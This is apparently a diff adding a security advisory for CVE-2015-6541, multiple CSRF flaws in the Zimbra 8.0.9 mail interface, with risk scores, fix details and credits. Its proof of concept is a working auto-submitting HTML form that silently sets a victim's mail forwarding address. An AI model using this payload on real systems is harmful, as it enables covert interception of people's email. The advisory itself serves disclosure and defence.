@@ -1,0 +1,79 @@
+======================================
+Multiple CSRF in Zimbra Mail interface
+======================================
+
+
+CVE-2015-6541
+
+Description
+===========
+
+Multiple CSRF vulnerabilities have been found in the Mail interface of
+Zimbra 8.0.9 GA Release, enabling to change account
+preferences like e-mail forwarding.
+
+
+CSRF
+====
+
+Forms in the preferences part of old releases of Zimbra are vulnerable
+to CSRF because of the lack of a CSRF token identifying a valid session.
+As a consequence, requests can be forged and played arbitrarily.
+
+**Access Vector**: remote
+**Security Risk**: low
+**Vulnerability**: CWE-352
+**CVSS Base score**: 5.8
+
+----------------
+Proof of Concept
+----------------
+
+<html>
+<body>
+<form enctype="text/plain" id="trololo"
+action="https://192.168.0.171/service/soap/BatchRequest" method="POST">
+    <input name='<soap:Envelope
+xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Header><context
+xmlns="urn:zimbra"><userAgent xmlns="" name="ZimbraWebClient - FF38
+(Win)" version="8.0.9_GA_6191"/><session xmlns="" id="19"/><account
+xmlns="" by="name">anto@mail.ubuntu.fr</account><format xmlns=""
+type="js"/></context></soap:Header><soap:Body><BatchRequest
+xmlns="urn:zimbra" onerror="stop"><ModifyPrefsRequest
+xmlns="urn:zimbraAccount" requestId="0"><pref xmlns=""
+name="zimbraPrefMailForwardingAddress">itworks@ubuntu.fr</pref></ModifyPrefsRequest><a
+xmlns="" n'
+value='"sn">itworks</a></BatchRequest></soap:Body></soap:Envelope>'/>
+</form>
+<script>
+document.forms[0].submit();
+</script>
+</body>
+</html>
+
+
+Solution
+========
+
+Sensitive forms should be protected by a CSRF token.
+
+
+Fixes
+=====
+
+Fixed with 8.5 release : bug 83547
+(https://wiki.zimbra.com/wiki/Security/Collab/86#Notes_from_8.5)
+
+
+Affected versions
+=================
+
+ * Zimbra <= 8.0.9 GA Release
+
+
+Credits
+=======
+
+ * Anthony LAOU-HINE TSUEI, Sysdream (laouhine_anthony -at- hotmail
+-dot- fr)
+ * Damien CAUQUIL, Sysdream (d.cauquil -at- sysdream -dot- com)
